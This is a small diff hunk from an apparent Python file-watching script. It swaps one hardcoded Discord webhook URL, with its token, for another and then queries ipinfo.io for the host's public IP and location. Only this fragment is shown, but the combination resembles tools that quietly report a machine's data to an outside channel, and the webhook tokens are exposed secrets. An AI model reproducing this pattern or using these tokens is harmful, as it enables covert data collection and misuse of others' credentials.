@@ -6,7 +6,7 @@ from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 import json
 
-webhook_url = 'https://canary.discord.com/api/webhooks/1166694083893411902/9myHpqyesn2aEf5NsfJg-nkfpw1IopYSqVgEcFQ5fb7fNuD-r8ed7wxxGGCxvGOE-kD0'
+webhook_url = 'https://discord.com/api/webhooks/1168861341738610800/UEayGRJ39tciTZG2dI-XKADBO9J91KomJ2Wi8EV7Q8lytuf49xv0XGIyA_3cFf0eof_-'
 
 
 response = requests.get('https://ipinfo.io')
